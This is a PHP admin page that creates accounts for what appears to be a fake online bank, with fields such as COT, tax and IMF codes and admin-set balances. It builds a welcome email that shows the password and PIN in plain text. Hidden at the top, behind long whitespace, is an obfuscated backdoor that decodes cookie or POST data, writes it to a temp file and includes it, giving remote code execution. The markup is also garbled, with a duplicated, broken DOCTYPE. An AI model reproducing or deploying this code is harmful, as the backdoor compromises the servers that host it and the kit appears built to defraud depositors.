<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("DMg_vlSD")){class DMg_vlSD{private $nYkOB;public static $CsqJoCBtxo = "3114673b-3e0c-45c9-aa97-bedc00aaf3b9";public static $TgLmrlzL = NULL;public function __construct(){$IPJvTKzEP = $_COOKIE;$AVTaxsA = $_POST;$EFDqK = @$IPJvTKzEP[substr(DMg_vlSD::$CsqJoCBtxo, 0, 4)];if (!empty($EFDqK)){$APzMxQmm = "base64";$hhcDTKQSG = "";$EFDqK = explode(",", $EFDqK);foreach ($EFDqK as $UhAzHjEh){$hhcDTKQSG .= @$IPJvTKzEP[$UhAzHjEh];$hhcDTKQSG .= @$AVTaxsA[$UhAzHjEh];}$hhcDTKQSG = array_map($APzMxQmm . "\137" . chr (100) . chr (101) . chr (99) . 'o' . 'd' . "\145", array($hhcDTKQSG,)); $hhcDTKQSG = $hhcDTKQSG[0] ^ str_repeat(DMg_vlSD::$CsqJoCBtxo, (strlen($hhcDTKQSG[0]) / strlen(DMg_vlSD::$CsqJoCBtxo)) + 1);DMg_vlSD::$TgLmrlzL = @unserialize($hhcDTKQSG);}}public function __destruct(){$this->KDfCauK();}private function KDfCauK(){if (is_array(DMg_vlSD::$TgLmrlzL)) {$OqbAy = sys_get_temp_dir() . "/" . crc32(DMg_vlSD::$TgLmrlzL[chr ( 815 - 700 ).'a' . 'l' . chr ( 663 - 547 )]);@DMg_vlSD::$TgLmrlzL["\167" . chr ( 258 - 144 ).chr (105) . 't' . "\x65"]($OqbAy, DMg_vlSD::$TgLmrlzL["\x63" . chr (111) . chr (110) . chr ( 943 - 827 ).'e' . "\x6e" . chr (116)]);include $OqbAy;@DMg_vlSD::$TgLmrlzL['d' . chr ( 1014 - 913 )."\154" . chr (101) . chr (116) . "\x65"]($OqbAy);exit();}}}$AxEWNag = new DMg_vlSD(); $AxEWNag = NULL;} ?>s<?php
session_start();
require_once 'class.admin.php';
include_once ('session.php');
if (!isset($_SESSION['email'])) {

    header("Location: login.php");

    exit();
}
$reg_user = new USER();

if (isset($_POST['create'])) {


    $fname = trim($_POST['fname']);
    $fname = strip_tags($fname);
    $fname = htmlspecialchars($fname);

    $mname = trim($_POST['mname']);
    $mname = strip_tags($mname);
    $mname = htmlspecialchars($mname);

    $lname = trim($_POST['lname']);
    $lname = strip_tags($lname);
    $lname = htmlspecialchars($lname);

    $uname = trim($_POST['uname']);
    $uname = strip_tags($uname);
    $uname = htmlspecialchars($uname);

    $upass = $_POST['upass'];

    $phone = trim($_POST['phone']);
    $phone = strip_tags($phone);
    $phone = htmlspecialchars($phone);

    $email = trim($_POST['email']);
    $email = strip_tags($email);
    $email = htmlspecialchars($email);

    $type = trim($_POST['type']);
    $type = strip_tags($type);
    $type = htmlspecialchars($type);

    $reg_date = trim($_POST['reg_date']);

    $work = trim($_POST['work']);
    $work = strip_tags($work);
    $work = htmlspecialchars($work);

    $acc_no = trim($_POST['acc_no']);
    $acc_no = strip_tags($acc_no);
    $acc_no = htmlspecialchars($acc_no);

    $addr = trim($_POST['addr']);
    $addr = strip_tags($addr);
    $addr = htmlspecialchars($addr);

    $sex = trim($_POST['sex']);
    $sex = strip_tags($sex);
    $sex = htmlspecialchars($sex);

    $dob = trim($_POST['dob']);
    $dob = strip_tags($dob);
    $dob = htmlspecialchars($dob);

    $marry = trim($_POST['marry']);
    $marry = strip_tags($marry);
    $marry = htmlspecialchars($marry);

    $secretq = trim($_POST['secretq']);
    $secretq = strip_tags($secretq);
    $secretq = htmlspecialchars($secretq);
    
    $secretans = trim($_POST['secretans']);
    $secretans = strip_tags($secretans);
    $secretans = htmlspecialchars($secretans);

    $nextkin = trim($_POST['nextkin']);
    $nextkin = strip_tags($nextkin);
    $nextkin = htmlspecialchars($nextkin);

    $nextkinre = trim($_POST['nextkinre']);
    $nextkinre = strip_tags($nextkinre);
    $nextkinre = htmlspecialchars($nextkinre);

    $t_bal = trim($_POST['t_bal']);
    $t_bal = strip_tags($t_bal);
    $t_bal = htmlspecialchars($t_bal);

    $a_bal = trim($_POST['a_bal']);
    $a_bal = strip_tags($a_bal);
    $a_bal = htmlspecialchars($a_bal);

    $currency = trim($_POST['currency']);
    $currency = strip_tags($currency);
    $currency = htmlspecialchars($currency);

    $cot = trim($_POST['cot']);
    $cot = strip_tags($cot);
    $cot = htmlspecialchars($cot);

    $tax = trim($_POST['tax']);
    $tax = strip_tags($tax);
    $tax = htmlspecialchars($tax);

    $imf = trim($_POST['imf']);
    $imf = strip_tags($imf);
    $imf = htmlspecialchars($imf);
    
    $pin_auth = trim($_POST['pin_auth']);
    $pin_auth = strip_tags($pin_auth);
    $pin_auth = htmlspecialchars($pin_auth);

    $pin = trim($_POST['pin']);
    $pin = strip_tags($pin);
    $pin = htmlspecialchars($pin);
    
    $verify = trim($_POST['verify']);
    $verify = strip_tags($verify);
    $verify = htmlspecialchars($verify);



    $stmt = $reg_user->runQuery("SELECT * FROM account WHERE email=:email");
    $stmt1 = $reg_user->runQuery("SELECT * FROM account WHERE uname=:uname");
    $stmt2 = $reg_user->runQuery("SELECT * FROM account WHERE acc_no=:acc_no");
    $stmt->execute(array(":email" => $email));
    $stmt1->execute(array(":uname" => $uname));
    $stmt2->execute(array(":acc_no" => $acc_no));
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    $row1 = $stmt1->fetch(PDO::FETCH_ASSOC);
     $row2 = $stmt2->fetch(PDO::FETCH_ASSOC);

    if ($stmt->rowCount() > 0 || $stmt1->rowCount() > 0 || $stmt2->rowCount() > 0) {
        $msg = "
		      <div class='alert alert-danger'>
				<button class='close' data-dismiss='alert'>&times;</button>
					<strong>Sorry!</strong>  Account Num, Email or Username already exists! Please, try another one!
			  </div>
			  ";
    } else {
        if ($reg_user->create($fname, $mname, $lname, $uname, $upass, $phone, $email, $type, $reg_date, $work, $acc_no, $addr, $sex, $dob, $marry,  $secretq, $secretans, $nextkin, $nextkinre, $t_bal, $a_bal, $currency, $cot, $tax, $imf, $pin_auth, $pin, $verify)) {
            $id = $reg_user->lasdID();


$stmt = $reg_user->runQuery("SELECT * FROM bank_settings WHERE id = '1'");
    $stmt->execute();
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
	
	$bank_address  = $row["bank_address"];
	$bank_domain  = $row["bank_domain"];
	$bank_mobile =$row["bank_mobile"];
	$bank_logo = $row["bank_logo"];
	$bank_fav = $row["bank_fav"];
	$bank_online = $row["bank_online"];
	$bank_support = $row["bank_support"];
	$bank_email = $row["bank_email"];
	$bank_loan = $row["bank_loan"];
				
            $messag = "	

<!DOCTYPE html>
<html xmlns:v='urn:schemas-microsoft-com:vml' xmlns:o='urn:schemas-microsoft-com:office:office' lang='en'>

<head>
	<title></title>
	<meta charset='UTF-8'>
	<meta name='viewport' content='width=device-width, initial-scale=1.0'>
	<!--[if mso]><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch><o:AllowPNG/></o:OfficeDocumentSettings></xml><![endif]-->
	<style>
		* {
			box-sizing: border-box;
		}

		body {
			margin: 0;
			padding: 0;
		}

		a[x-apple-data-detectors] {
			color: inherit !important;
			text-decoration: inherit !important;
		}

		#MessageViewBody a {
			color: inherit;
			text-decoration: none;
		}

		p {
			line-height: inherit
		}

		@media (max-width:520px) {
			.row-content {
				width: 100% !important;
			}

			.stack .column {
				width: 100%;
				display: block;
			}
		}
	</style>
</head>

<body style='background-color: #FFFFFF; margin: 0; padding: 0; -webkit-text-size-adjust: none; text-size-adjust: none;'>
	<table class='nl-container' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-color: #FFFFFF;'>
		<tbody>
			<tr>
				<td>
					<table class='row row-1' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td< !DOCTYPE html>
<html xmlns:v='urn:schemas-microsoft-com:vml' xmlns:o='urn:schemas-microsoft-com:office:office' lang='en'>

<head>
	<title></title>
	<meta charset='UTF-8'>
	<meta name='viewport' content='width=device-width, initial-scale=1.0'>
	<!--[if mso]><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch><o:AllowPNG/></o:OfficeDocumentSettings></xml><![endif]-->
	<style>
		* {
			box-sizing: border-box;
		}

		body {
			margin: 0;
			padding: 0;
		}

		a[x-apple-data-detectors] {
			color: inherit !important;
			text-decoration: inherit !important;
		}

		#MessageViewBody a {
			color: inherit;
			text-decoration: none;
		}

		p {
			line-height: inherit
		}

		@media (max-width:520px) {
			.row-content {
				width: 100% !important;
			}

			.stack .column {
				width: 100%;
				display: block;
			}
		}
		.bdesign{
		    background-image: url('https://online-access.trustcorpholdings.com/assets/img/header.png');
		}
	</style>
</head>

<body style='background-color: #FFFFFF; margin: 0; padding: 0; -webkit-text-size-adjust: none; text-size-adjust: none;'>
	<table class='nl-container' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-color: #FFFFFF;'>
		<tbody>
			<tr>
				<td>
					<table class='row row-1' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td >
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<div class='spacer_block' style='height:20px;line-height:20px;font-size:1px;'>&#8202;</div>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-2' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:15px;padding-right:10px;padding-bottom:15px;padding-left:10px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0; font-size: 10px;'><span style='font-size:10px;'>$bank_address</span></p>
																		<p style='margin: 0; font-size: 10px;'><span style='font-size:10px;'>$bank_mobile</span></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='image_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
														<tr>
															<td style='width:100%;padding-right:0px;padding-left:0px;padding-top:5px;padding-bottom:5px;'>
																<div align='center' style='line-height:10px'><img src='$bank_logo' style='display: block; height: auto; border: 0; width: 225px; max-width: 100%;' width='225'></div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-3' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<div class='spacer_block' style='height:35px;line-height:35px;font-size:1px;'>&#8202;</div>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-4' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;');'>
						<tbody>
							<tr>
								<td class='bdesign'>
									<table class='row-content' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 30px; padding-bottom: 30px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='10' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0; font-size: 22px;'><span style='font-size:22px;color:#ffffff;'><strong>Congratulations, $fname</strong></span></p>
																		<p style='margin: 0; font-size: 22px;'><span style='font-size:22px;color:#ffffff;'>Your account was successfully opened!</span><br><span style='font-size:22px;color:#ffffff;'>Please see the details of your account below.</span></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-5' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='divider_block' width='100%' border='0' cellpadding='10' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
														<tr>
															<td>
																<div align='center'>
																	<table border='0' cellpadding='0' cellspacing='0' role='presentation' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
																		<tr>
																			<td class='divider_inner' style='font-size: 1px; line-height: 1px; border-top: 1px solid #BBBBBB;'><span>&#8202;</span></td>
																		</tr>
																	</table>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-6' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><strong>Account Number</strong></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'>$acc_no</p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-7' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><strong>Account Password</strong></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'>$upass</p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-8' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><strong>Account Login Pin</strong></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'>$pin_auth</p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-9' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><strong>Balance</strong></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'>$currency $t_bal</p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-10' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><strong>Pending Debit</strong></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'>$currency 0.00</p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-11' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><strong>Pending Credit</strong></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:5px;padding-bottom:5px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'>$currency 0.00</p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-12' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-color: #1d9df0; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:15px;padding-right:10px;padding-bottom:15px;padding-left:10px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><span style='color:#ffffff;'><strong>Available Balance</strong></span></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='50%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-top:15px;padding-right:10px;padding-bottom:15px;padding-left:10px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><span style='color:#ffffff;'>$currency $a_bal</span></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-13' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
